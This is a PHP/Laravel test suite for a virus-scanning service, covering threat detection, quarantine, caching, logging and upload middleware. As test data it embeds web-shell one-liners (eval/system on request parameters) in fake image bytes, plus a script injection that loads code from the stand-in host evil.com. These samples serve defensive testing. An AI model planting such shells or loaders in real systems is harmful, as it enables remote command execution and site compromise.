<?php

namespace Tests\Feature;

use App\Services\VirusScanningService;
use App\Jobs\VirusScanFileJob;
use App\Enums\ScanStatus;
use App\Enums\ThreatLevel;
use Tests\TestCase;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;

/**
 * Comprehensive Virus Scanning Test Suite
 * 
 * Tests all aspects of the virus scanning system including:
 * - Multi-engine scanning capabilities
 * - Threat detection and classification
 * - File quarantine procedures
 * - Security monitoring and alerting
 * - Integration with file upload workflows
 */
class VirusScanningTest extends TestCase
{
    use RefreshDatabase;
    
    private VirusScanningService $virusScanner;
    private string $testFilesPath;
    
    protected function setUp(): void
    {
        parent::setUp();
        
        $this->virusScanner = new VirusScanningService();
        $this->testFilesPath = storage_path('test-files');
        
        // Create test files directory
        if (!is_dir($this->testFilesPath)) {
            mkdir($this->testFilesPath, 0755, true);
        }
        
        // Set up storage disks for testing
        Storage::fake('private');
        Storage::fake('public');
        Storage::fake('quarantine');
    }
    
    protected function tearDown(): void
    {
        // Clean up test files
        if (is_dir($this->testFilesPath)) {
            $this->removeDirectory($this->testFilesPath);
        }
        
        parent::tearDown();
    }
    
    /**
     * Test clean file scanning
     */
    public function test_clean_file_passes_scan(): void
    {
        $cleanFile = $this->createTestFile('clean_image.jpg', $this->createCleanImageContent());
        
        $result = $this->virusScanner->scanFile($cleanFile, 'test_context');
        
        $this->assertTrue($result['is_clean']);
        $this->assertEquals(ScanStatus::CLEAN, $result['status']);
        $this->assertEquals(ThreatLevel::NONE, $result['threat_level']);
        $this->assertEmpty($result['threats_found']);
        $this->assertFalse($result['quarantined']);
        $this->assertGreaterThan(0, $result['scan_duration']);
    }
    
    /**
     * Test malicious file detection
     */
    public function test_malicious_file_detected(): void
    {
        $maliciousFile = $this->createTestFile('malicious.jpg', $this->createMaliciousContent());
        
        $result = $this->virusScanner->scanFile($maliciousFile, 'test_context');
        
        $this->assertFalse($result['is_clean']);
        $this->assertEquals(ScanStatus::INFECTED, $result['status']);
        $this->assertNotEquals(ThreatLevel::NONE, $result['threat_level']);
        $this->assertNotEmpty($result['threats_found']);
        $this->assertGreaterThan(0, $result['scan_duration']);
    }
    
    /**
     * Test PHP backdoor detection
     */
    public function test_php_backdoor_detection(): void
    {
        $phpBackdoor = '<?php eval($_POST["cmd"]); ?>';
        $maliciousFile = $this->createTestFile('backdoor.jpg', $this->createImageWithEmbeddedContent($phpBackdoor));
        
        $result = $this->virusScanner->scanFile($maliciousFile, 'test_context');
        
        $this->assertFalse($result['is_clean']);
        $this->assertEquals(ThreatLevel::CRITICAL, $result['threat_level']);
        
        $phpThreats = array_filter($result['threats_found'], function($threat) {
            return str_contains($threat['threat_name'], 'PHP') || str_contains($threat['threat_name'], 'eval');
        });
        
        $this->assertNotEmpty($phpThreats);
    }
    
    /**
     * Test JavaScript injection detection
     */
    public function test_javascript_injection_detection(): void
    {
        $jsInjection = '<script>document.write(unescape("%3Cscript%20src%3D%22http%3A//evil.com/xss.js%22%3E%3C/script%3E"));</script>';
        $maliciousFile = $this->createTestFile('js_inject.png', $this->createImageWithEmbeddedContent($jsInjection));
        
        $result = $this->virusScanner->scanFile($maliciousFile, 'test_context');
        
        $this->assertFalse($result['is_clean']);
        $this->assertNotEquals(ThreatLevel::NONE, $result['threat_level']);
        
        $jsThreats = array_filter($result['threats_found'], function($threat) {
            return str_contains($threat['threat_name'], 'JavaScript') || str_contains($threat['threat_name'], 'unescape');
        });
        
        $this->assertNotEmpty($jsThreats);
    }
    
    /**
     * Test executable file detection
     */
    public function test_executable_detection(): void
    {
        // Create file with PE executable signature
        $executableContent = "\x4D\x5A\x90\x00" . str_repeat("A", 100) . "\x50\x45\x00\x00"; // MZ header + PE signature
        $maliciousFile = $this->createTestFile('fake_image.jpg', $executableContent);
        
        $result = $this->virusScanner->scanFile($maliciousFile, 'test_context');
        
        $this->assertFalse($result['is_clean']);
        
        $executableThreats = array_filter($result['threats_found'], function($threat) {
            return str_contains($threat['threat_name'], 'executable') || str_contains($threat['threat_name'], 'PE');
        });
        
        $this->assertNotEmpty($executableThreats);
    }
    
    /**
     * Test file type mismatch detection
     */
    public function test_file_type_mismatch_detection(): void
    {
        // Create PNG content but save as JPG
        $pngContent = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A" . str_repeat("\x00", 100);
        $mismatchFile = $this->createTestFile('mismatch.jpg', $pngContent);
        
        $result = $this->virusScanner->scanFile($mismatchFile, 'test_context');
        
        $this->assertFalse($result['is_clean']);
        
        $mismatchThreats = array_filter($result['threats_found'], function($threat) {
            return str_contains($threat['threat_name'], 'mismatch') || str_contains($threat['type'], 'file_type_mismatch');
        });
        
        $this->assertNotEmpty($mismatchThreats);
    }
    
    /**
     * Test multiple threats detection
     */
    public function test_multiple_threats_detection(): void
    {
        $multiThreatContent = $this->createImageWithEmbeddedContent('
            <?php system($_GET["cmd"]); ?>
            <script>eval(atob("YWxlcnQoMSk="));</script>
            document.write("XSS");
            base64_decode("malicious");
        ');
        
        $maliciousFile = $this->createTestFile('multi_threat.gif', $multiThreatContent);
        
        $result = $this->virusScanner->scanFile($maliciousFile, 'test_context');
        
        $this->assertFalse($result['is_clean']);
        $this->assertEquals(ThreatLevel::CRITICAL, $result['threat_level']);
        $this->assertGreaterThanOrEqual(3, count($result['threats_found']));
        
        // Verify different threat types are detected
        $threatTypes = array_unique(array_column($result['threats_found'], 'type'));
        $this->assertGreaterThan(1, count($threatTypes));
    }
    
    /**
     * Test file quarantine functionality
     */
    public function test_file_quarantine(): void
    {
        $maliciousFile = $this->createTestFile('quarantine_test.jpg', $this->createMaliciousContent());
        
        $result = $this->virusScanner->scanFile($maliciousFile, 'test_context');
        
        $this->assertFalse($result['is_clean']);
        
        if ($result['threat_level']->requiresQuarantine()) {
            $this->assertTrue($result['quarantined']);
            
            // Verify original file no longer exists
            $this->assertFileDoesNotExist($maliciousFile);
            
            // Verify quarantine directory contains files
            $quarantineDir = storage_path('app/quarantine');
            if (is_dir($quarantineDir)) {
                $quarantineFiles = glob($quarantineDir . '/*');
                $this->assertNotEmpty($quarantineFiles);
            }
        }
    }
    
    /**
     * Test virus scanning job integration
     */
    public function test_virus_scanning_job_dispatch(): void
    {
        Queue::fake();
        
        $testFile = $this->createTestFile('job_test.jpg', $this->createCleanImageContent());
        
        VirusScanFileJob::dispatch($testFile, 'test_context', 1);
        
        Queue::assertPushed(VirusScanFileJob::class, function ($job) use ($testFile) {
            return $job->filePath === $testFile &&
                   $job->context === 'test_context' &&
                   $job->userId === 1;
        });
    }
    
    /**
     * Test scan result caching
     */
    public function test_scan_result_caching(): void
    {
        Cache::shouldReceive('put')
            ->with('virus_scan_status_' . 'test-job-id', \Mockery::any(), 3600)
            ->once();
        
        Cache::shouldReceive('put')
            ->with('virus_scan_result_' . 'test-job-id', \Mockery::any(), 86400)
            ->once();
        
        $testFile = $this->createTestFile('cache_test.jpg', $this->createCleanImageContent());
        $this->virusScanner->scanFile($testFile, 'test_context');
    }
    
    /**
     * Test scan metrics collection
     */
    public function test_scan_metrics_collection(): void
    {
        $testFile = $this->createTestFile('metrics_test.jpg', $this->createCleanImageContent());
        
        $result = $this->virusScanner->scanFile($testFile, 'test_context');
        
        $this->assertArrayHasKey('scan_duration', $result);
        $this->assertArrayHasKey('scan_engines', $result);
        $this->assertArrayHasKey('metadata', $result);
        
        $metadata = $result['metadata'];
        $this->assertArrayHasKey('file_size', $metadata);
        $this->assertArrayHasKey('file_type', $metadata);
        $this->assertArrayHasKey('scan_timestamp', $metadata);
    }
    
    /**
     * Test large file handling
     */
    public function test_large_file_handling(): void
    {
        // Create a large file (simulate 60MB)
        $largeContent = str_repeat("A", 60 * 1024 * 1024);
        $largeFile = $this->createTestFile('large_file.jpg', $largeContent);
        
        $result = $this->virusScanner->scanFile($largeFile, 'test_context');
        
        // Should fail due to size limit
        $this->assertEquals(ScanStatus::FAILED, $result['status']);
        $this->assertStringContainsString('too large', $result['threats_found'][0] ?? '');
    }
    
    /**
     * Test corrupted file handling
     */
    public function test_corrupted_file_handling(): void
    {
        $corruptedFile = $this->createTestFile('corrupted.jpg', 'corrupted_content');
        
        $result = $this->virusScanner->scanFile($corruptedFile, 'test_context');
        
        // Should handle gracefully
        $this->assertArrayHasKey('status', $result);
        $this->assertArrayHasKey('is_clean', $result);
    }
    
    /**
     * Test concurrent scanning
     */
    public function test_concurrent_scanning(): void
    {
        $files = [];
        
        // Create multiple test files
        for ($i = 0; $i < 5; $i++) {
            $files[] = $this->createTestFile("concurrent_test_{$i}.jpg", $this->createCleanImageContent());
        }
        
        $results = [];
        
        // Simulate concurrent scans
        foreach ($files as $file) {
            $results[] = $this->virusScanner->scanFile($file, 'concurrent_test');
        }
        
        // All scans should complete
        $this->assertCount(5, $results);
        
        foreach ($results as $result) {
            $this->assertArrayHasKey('status', $result);
            $this->assertArrayHasKey('is_clean', $result);
        }
    }
    
    /**
     * Test security monitoring integration
     */
    public function test_security_monitoring(): void
    {
        Log::shouldReceive('warning')
            ->with('SECURITY THREAT DETECTED', \Mockery::any())
            ->once();
        
        Log::shouldReceive('info')
            ->with(\Mockery::any(), \Mockery::any())
            ->atLeast()->once();
        
        $maliciousFile = $this->createTestFile('monitoring_test.jpg', $this->createMaliciousContent());
        
        $result = $this->virusScanner->scanFile($maliciousFile, 'security_monitoring_test');
        
        $this->assertFalse($result['is_clean']);
    }
    
    /**
     * Test threat level calculation
     */
    public function test_threat_level_calculation(): void
    {
        // Test low-level threat
        $lowThreatFile = $this->createTestFile('low_threat.jpg', $this->createImageWithEmbeddedContent('suspicious_string'));
        $lowResult = $this->virusScanner->scanFile($lowThreatFile, 'test');
        
        // Test high-level threat  
        $highThreatFile = $this->createTestFile('high_threat.jpg', $this->createImageWithEmbeddedContent('<?php eval($_POST["cmd"]); ?>'));
        $highResult = $this->virusScanner->scanFile($highThreatFile, 'test');
        
        if (!$lowResult['is_clean'] && !$highResult['is_clean']) {
            $this->assertTrue($highResult['threat_level']->isHigherThan($lowResult['threat_level']));
        }
    }
    
    /**
     * Test emergency sanitization
     */
    public function test_emergency_sanitization(): void
    {
        $maliciousContent = '<script>alert("xss")</script><p>Safe content</p>';
        
        $sanitized = $this->virusScanner->emergencySanitize($maliciousContent);
        
        $this->assertStringNotContainsString('<script>', $sanitized);
        $this->assertStringNotContainsString('alert', $sanitized);
        $this->assertStringContainsString('Safe content', $sanitized);
    }
    
    /**
     * Helper method to create test files
     */
    private function createTestFile(string $filename, string $content): string
    {
        $filePath = $this->testFilesPath . '/' . $filename;
        file_put_contents($filePath, $content);
        return $filePath;
    }
    
    /**
     * Create clean image content
     */
    private function createCleanImageContent(): string
    {
        // Simple JPEG header
        return "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xFF\xDB" . str_repeat("\x00", 100) . "\xFF\xD9";
    }
    
    /**
     * Create malicious content
     */
    private function createMaliciousContent(): string
    {
        $maliciousCode = '<?php system($_GET["cmd"]); eval($_POST["data"]); ?>';
        return $this->createImageWithEmbeddedContent($maliciousCode);
    }
    
    /**
     * Create image with embedded content
     */
    private function createImageWithEmbeddedContent(string $content): string
    {
        $imageHeader = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00";
        $imageData = str_repeat("\x00", 200);
        $imageFooter = "\xFF\xD9";
        
        return $imageHeader . $imageData . $content . $imageFooter;
    }
    
    /**
     * Remove directory recursively
     */
    private function removeDirectory(string $dir): void
    {
        if (!is_dir($dir)) {
            return;
        }
        
        $files = array_diff(scandir($dir), ['.', '..']);
        
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            if (is_dir($path)) {
                $this->removeDirectory($path);
            } else {
                unlink($path);
            }
        }
        
        rmdir($dir);
    }
    
    /**
     * Test middleware integration with file uploads
     */
    public function test_middleware_integration(): void
    {
        // This would test the FileUploadSecurity middleware
        // with actual HTTP requests
        
        $maliciousUpload = UploadedFile::fake()->create('malicious.jpg', 100)
            ->mimeType('image/jpeg');
        
        // Simulate malicious content in the fake file
        $reflection = new \ReflectionObject($maliciousUpload);
        $property = $reflection->getProperty('tempFile');
        $property->setAccessible(true);
        
        if ($tempFile = $property->getValue($maliciousUpload)) {
            file_put_contents($tempFile, $this->createMaliciousContent());
        }
        
        $response = $this->actingAs($this->createUser())
            ->post('/test-upload', [
                'file' => $maliciousUpload
            ]);
        
        // Should be blocked by middleware
        $this->assertEquals(403, $response->getStatusCode());
    }
    
    /**
     * Create test user
     */
    private function createUser()
    {
        return \App\Models\User::factory()->create();
    }
}